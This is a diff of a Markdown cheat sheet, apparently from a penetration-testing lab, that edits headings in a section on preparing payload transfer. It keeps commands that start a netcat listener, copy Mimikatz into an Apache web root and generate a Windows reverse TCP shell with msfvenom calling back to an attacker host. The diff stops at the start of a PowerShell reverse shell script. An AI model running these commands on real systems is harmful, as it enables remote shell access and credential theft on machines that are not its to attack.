@@ -13,28 +13,23 @@ nc -nlvp 4444
 
 ## Prepare payload transfer
 
-### Setup web server
+Prepare files to web server root
 
-```console
-systemctl start apache2
-systemctl status apache2
-```
+(Apache2 is already running with DocumentRoot at `/var/www/html`)
 
-### Prepare files to web server root
-
-#### Mimikatz:
+### Mimikatz:
 
 ```console
 cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe /var/www/html
 ```
 
-#### Windows reverse shell TCP:
+### Windows reverse shell TCP:
 
 ```console
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f exe -o /var/www/html/reverse.exe
 ```
 
-#### PowerShell-based reverse shell script:
+### PowerShell-based reverse shell script:
 
 `vi /var/www/html/reverse.ps1` with below code:
 
